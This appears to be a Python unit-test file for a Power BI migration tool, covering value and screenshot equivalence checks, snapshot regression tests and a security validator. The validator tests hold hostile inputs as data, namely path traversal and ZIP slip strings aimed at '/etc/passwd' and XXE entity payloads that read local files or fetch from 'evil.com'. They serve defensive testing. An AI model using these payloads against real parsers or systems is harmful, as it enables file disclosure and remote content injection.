"""
Tests for v15.0 Sprint FF — equivalence tester, regression suite,
and security validator.
"""

import json
import math
import os
import shutil
import tempfile
import unittest

from powerbi_import.equivalence_tester import (
    compare_values,
    compare_screenshots,
    save_equivalence_report,
    _compute_ssim,
    _values_equal,
    _flatten,
    DEFAULT_TOLERANCE,
)
from powerbi_import.regression_suite import (
    generate_snapshots,
    compare_snapshots,
    update_snapshots,
)
from powerbi_import.security_validator import (
    validate_path,
    validate_paths,
    check_xxe,
    validate_zip_entry,
    validate_project_output,
)


# ── Helpers ──────────────────────────────────────────────────────

def _write_text(directory, filename, content):
    os.makedirs(directory, exist_ok=True)
    with open(os.path.join(directory, filename), "w", encoding="utf-8") as f:
        f.write(content)


# ═══════════════════════════════════════════════════════════════════
# Equivalence Tester Tests
# ═══════════════════════════════════════════════════════════════════

class TestValueComparison(unittest.TestCase):
    """FF.1: Row-level value comparison."""

    def test_identical_rows_positional(self):
        rows = [{"A": 1, "B": "x"}, {"A": 2, "B": "y"}]
        result = compare_values(rows, rows)
        self.assertEqual(result["summary"]["match_rate"], 1.0)
        self.assertEqual(result["summary"]["mismatches"], 0)

    def test_numeric_within_tolerance(self):
        mstr = [{"val": 1.001}]
        pbi = [{"val": 1.002}]
        result = compare_values(mstr, pbi, tolerance=0.01)
        self.assertEqual(result["summary"]["matches"], 1)

    def test_numeric_outside_tolerance(self):
        mstr = [{"val": 1.0}]
        pbi = [{"val": 2.0}]
        result = compare_values(mstr, pbi, tolerance=0.01)
        self.assertEqual(result["summary"]["mismatches"], 1)

    def test_string_mismatch(self):
        mstr = [{"name": "Sales"}]
        pbi = [{"name": "Revenue"}]
        result = compare_values(mstr, pbi)
        self.assertEqual(result["summary"]["mismatches"], 1)

    def test_missing_rows_mstr(self):
        mstr = [{"A": 1}]
        pbi = [{"A": 1}, {"A": 2}]
        result = compare_values(mstr, pbi)
        self.assertEqual(result["summary"]["missing_mstr"], 1)

    def test_missing_rows_pbi(self):
        mstr = [{"A": 1}, {"A": 2}]
        pbi = [{"A": 1}]
        result = compare_values(mstr, pbi)
        self.assertEqual(result["summary"]["missing_pbi"], 1)

    def test_key_based_join(self):
        mstr = [{"id": 1, "val": 10}, {"id": 2, "val": 20}]
        pbi = [{"id": 2, "val": 20}, {"id": 1, "val": 10}]
        result = compare_values(mstr, pbi, key_columns=["id"])
        self.assertEqual(result["summary"]["match_rate"], 1.0)

    def test_key_based_mismatch(self):
        mstr = [{"id": 1, "val": 10}]
        pbi = [{"id": 1, "val": 999}]
        result = compare_values(mstr, pbi, key_columns=["id"])
        self.assertEqual(result["summary"]["mismatches"], 1)

    def test_key_based_missing(self):
        mstr = [{"id": 1, "val": 10}]
        pbi = [{"id": 2, "val": 20}]
        result = compare_values(mstr, pbi, key_columns=["id"])
        self.assertEqual(result["summary"]["missing_mstr"], 1)
        self.assertEqual(result["summary"]["missing_pbi"], 1)

    def test_empty_datasets(self):
        result = compare_values([], [])
        self.assertEqual(result["summary"]["total_rows"], 0)
        self.assertEqual(result["summary"]["match_rate"], 1.0)

    def test_none_values_match(self):
        mstr = [{"val": None}]
        pbi = [{"val": None}]
        result = compare_values(mstr, pbi)
        self.assertEqual(result["summary"]["matches"], 1)

    def test_nan_values_match(self):
        self.assertTrue(_values_equal(float("nan"), float("nan"), 0.01))

    def test_none_vs_value(self):
        self.assertFalse(_values_equal(None, 1, 0.01))
        self.assertFalse(_values_equal(1, None, 0.01))

    def test_save_report(self):
        result = compare_values([{"A": 1}], [{"A": 1}])
        tmpdir = tempfile.mkdtemp()
        try:
            path = save_equivalence_report(result, tmpdir)
            self.assertTrue(os.path.exists(path))
        finally:
            shutil.rmtree(tmpdir)


class TestScreenshotComparison(unittest.TestCase):
    """FF.2: SSIM-based screenshot comparison."""

    def test_identical_images(self):
        pixels = [128] * 100
        imgs = [{"page": "P1", "pixels": pixels}]
        result = compare_screenshots(imgs, imgs)
        self.assertAlmostEqual(result["pages"][0]["ssim"], 1.0, places=2)

    def test_different_images(self):
        a = [{"page": "P1", "pixels": [0] * 100}]
        b = [{"page": "P1", "pixels": [255] * 100}]
        result = compare_screenshots(a, b)
        self.assertLess(result["pages"][0]["ssim"], 0.5)

    def test_flagged_pages(self):
        a = [{"page": "P1", "pixels": [0] * 100}]
        b = [{"page": "P1", "pixels": [255] * 100}]
        result = compare_screenshots(a, b, threshold=0.85)
        self.assertEqual(result["summary"]["flagged_pages"], 1)

    def test_empty_images(self):
        result = compare_screenshots([], [])
        self.assertEqual(result["summary"]["total_pages"], 0)

    def test_rgb_pixels(self):
        # RGB tuples
        a = [{"page": "P1", "pixels": [(128, 128, 128)] * 50}]
        b = [{"page": "P1", "pixels": [(128, 128, 128)] * 50}]
        result = compare_screenshots(a, b)
        self.assertAlmostEqual(result["pages"][0]["ssim"], 1.0, places=2)

    def test_ssim_with_empty_pixels(self):
        self.assertEqual(_compute_ssim([], []), 0.0)

    def test_flatten_mixed(self):
        result = _flatten([(255, 0, 0), 128, (0, 255, 0)])
        self.assertEqual(len(result), 3)


# ═══════════════════════════════════════════════════════════════════
# Regression Suite Tests
# ═══════════════════════════════════════════════════════════════════

class TestRegressionSuite(unittest.TestCase):
    """FF.3-FF.4: Snapshot generation and comparison."""

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.project = os.path.join(self.tmpdir, "project")
        self.snapdir = os.path.join(self.tmpdir, "snapshots")

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def test_generate_snapshots(self):
        _write_text(self.project, "model.tmdl", "table Foo")
        _write_text(self.project, "data.json", '{"x":1}')
        manifest = generate_snapshots(self.project, self.snapdir)
        self.assertEqual(manifest["file_count"], 2)

    def test_compare_no_drift(self):
        _write_text(self.project, "model.tmdl", "table Foo")
        generate_snapshots(self.project, self.snapdir)
        result = compare_snapshots(self.project, self.snapdir)
        self.assertEqual(result["summary"]["drifted"], 0)
        self.assertEqual(result["summary"]["unchanged"], 1)

    def test_compare_with_drift(self):
        _write_text(self.project, "model.tmdl", "table Foo")
        generate_snapshots(self.project, self.snapdir)
        # Modify the file
        _write_text(self.project, "model.tmdl", "table Bar")
        result = compare_snapshots(self.project, self.snapdir)
        self.assertEqual(result["summary"]["drifted"], 1)

    def test_compare_added_file(self):
        _write_text(self.project, "model.tmdl", "table Foo")
        generate_snapshots(self.project, self.snapdir)
        _write_text(self.project, "new.json", '{"new":true}')
        result = compare_snapshots(self.project, self.snapdir)
        self.assertEqual(result["summary"]["added"], 1)

    def test_compare_removed_file(self):
        _write_text(self.project, "model.tmdl", "table Foo")
        _write_text(self.project, "extra.tmdl", "table Extra")
        generate_snapshots(self.project, self.snapdir)
        os.remove(os.path.join(self.project, "extra.tmdl"))
        result = compare_snapshots(self.project, self.snapdir)
        self.assertEqual(result["summary"]["removed"], 1)

    def test_compare_no_manifest(self):
        result = compare_snapshots(self.project, self.snapdir)
        self.assertIn("error", result)

    def test_update_snapshots(self):
        _write_text(self.project, "model.tmdl", "v1")
        generate_snapshots(self.project, self.snapdir)
        _write_text(self.project, "model.tmdl", "v2")
        manifest = update_snapshots(self.project, self.snapdir)
        self.assertEqual(manifest["file_count"], 1)
        # After update, no drift
        result = compare_snapshots(self.project, self.snapdir)
        self.assertEqual(result["summary"]["drifted"], 0)

    def test_ignores_untracked_extensions(self):
        _write_text(self.project, "readme.txt", "hello")
        manifest = generate_snapshots(self.project, self.snapdir)
        self.assertEqual(manifest["file_count"], 0)

    def test_nested_files(self):
        sub = os.path.join(self.project, "tables")
        _write_text(sub, "Sales.tmdl", "table Sales")
        manifest = generate_snapshots(self.project, self.snapdir)
        self.assertEqual(manifest["file_count"], 1)
        paths = [f["path"] for f in manifest["files"]]
        self.assertTrue(any("tables/" in p for p in paths))

    def test_default_snapshot_dir(self):
        _write_text(self.project, "model.tmdl", "test")
        manifest = generate_snapshots(self.project)
        # Should create snapshots subdir in project
        self.assertTrue(os.path.isdir(os.path.join(self.project, "snapshots")))
        self.assertEqual(manifest["file_count"], 1)


# ═══════════════════════════════════════════════════════════════════
# Security Validator Tests
# ═══════════════════════════════════════════════════════════════════

class TestPathValidation(unittest.TestCase):
    """FF.5: Path traversal and directory escape detection."""

    def test_safe_relative_path(self):
        result = validate_path("model.tmdl", "/output")
        self.assertTrue(result["valid"])

    def test_traversal_detected(self):
        result = validate_path("../../etc/passwd", "/output")
        self.assertFalse(result["valid"])
        self.assertTrue(any("traversal" in e.lower() for e in result["errors"]))

    def test_directory_escape(self):
        result = validate_path("/etc/passwd", "/output")
        self.assertFalse(result["valid"])

    def test_dangerous_extension(self):
        result = validate_path("payload.exe", "/output")
        self.assertFalse(result["valid"])
        self.assertTrue(any("dangerous" in e.lower() for e in result["errors"]))

    def test_sensitive_file_warning(self):
        result = validate_path(".env", "/output")
        self.assertTrue(len(result["warnings"]) > 0)
        # Still valid (warning, not error)
        self.assertTrue(result["valid"])

    def test_nested_safe_path(self):
        result = validate_path("tables/Sales.tmdl", "/output/project")
        self.assertTrue(result["valid"])

    def test_tilde_traversal(self):
        result = validate_path("~/secret", "/output")
        self.assertFalse(result["valid"])

    def test_bat_extension(self):
        result = validate_path("run.bat", "/output")
        self.assertFalse(result["valid"])

    def test_ps1_extension(self):
        result = validate_path("script.ps1", "/output")
        self.assertFalse(result["valid"])


class TestPathsValidation(unittest.TestCase):
    """Bulk path validation."""

    def test_all_valid(self):
        paths = ["model.tmdl", "data.json", "query.m"]
        result = validate_paths(paths, "/output")
        self.assertTrue(result["valid"])
        self.assertEqual(result["summary"]["valid"], 3)

    def test_mixed_valid_invalid(self):
        paths = ["model.tmdl", "../../etc/passwd", "data.json"]
        result = validate_paths(paths, "/output")
        self.assertFalse(result["valid"])
        self.assertEqual(result["summary"]["invalid"], 1)

    def test_empty_paths(self):
        result = validate_paths([], "/output")
        self.assertTrue(result["valid"])


class TestXXEDetection(unittest.TestCase):
    """XXE pattern detection in XML content."""

    def test_safe_xml(self):
        content = '<root><item>hello</item></root>'
        result = check_xxe(content)
        self.assertTrue(result["safe"])

    def test_entity_detected(self):
        content = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        result = check_xxe(content)
        self.assertFalse(result["safe"])
        self.assertGreater(len(result["findings"]), 0)

    def test_system_keyword(self):
        content = '<!ENTITY foo SYSTEM "http://evil.com/payload">'
        result = check_xxe(content)
        self.assertFalse(result["safe"])

    def test_public_keyword(self):
        content = '<!ENTITY foo PUBLIC "id" "http://evil.com/dtd">'
        result = check_xxe(content)
        self.assertFalse(result["safe"])

    def test_normal_text(self):
        result = check_xxe("Just plain text content")
        self.assertTrue(result["safe"])


class TestZipSlipPrevention(unittest.TestCase):
    """ZIP slip (path traversal in archives)."""

    def test_safe_entry(self):
        result = validate_zip_entry("model.tmdl", "/extract")
        self.assertTrue(result["safe"])

    def test_traversal_entry(self):
        result = validate_zip_entry("../../etc/passwd", "/extract")
        self.assertFalse(result["safe"])
        self.assertIn("ZIP slip", result["error"])

    def test_absolute_path_entry(self):
        # On Windows absolute path may vary; test with traversal
        result = validate_zip_entry("../outside/file.txt", "/extract")
        self.assertFalse(result["safe"])

    def test_nested_safe_entry(self):
        result = validate_zip_entry("tables/Sales.tmdl", "/extract")
        self.assertTrue(result["safe"])


class TestProjectOutputValidation(unittest.TestCase):
    """Scan output directory for security issues."""

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def test_clean_output(self):
        _write_text(self.tmpdir, "model.tmdl", "table Foo")
        _write_text(self.tmpdir, "data.json", '{"x":1}')
        result = validate_project_output(self.tmpdir)
        self.assertTrue(result["valid"])

    def test_dangerous_file_detected(self):
        _write_text(self.tmpdir, "payload.exe", "MZ...")
        result = validate_project_output(self.tmpdir)
        self.assertFalse(result["valid"])

    def test_sensitive_file_warning(self):
        _write_text(self.tmpdir, ".env", "SECRET=val")
        result = validate_project_output(self.tmpdir)
        self.assertGreater(len(result["warnings"]), 0)

    def test_xxe_in_xml(self):
        _write_text(
            self.tmpdir, "bad.xml",
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root/>'
        )
        result = validate_project_output(self.tmpdir)
        self.assertFalse(result["valid"])

    def test_nonexistent_dir(self):
        result = validate_project_output("/nonexistent")
        self.assertTrue(result["valid"])  # nothing to check

    def test_nested_dangerous_file(self):
        sub = os.path.join(self.tmpdir, "sub")
        _write_text(sub, "script.bat", "@echo off")
        result = validate_project_output(self.tmpdir)
        self.assertFalse(result["valid"])


if __name__ == "__main__":
    unittest.main()
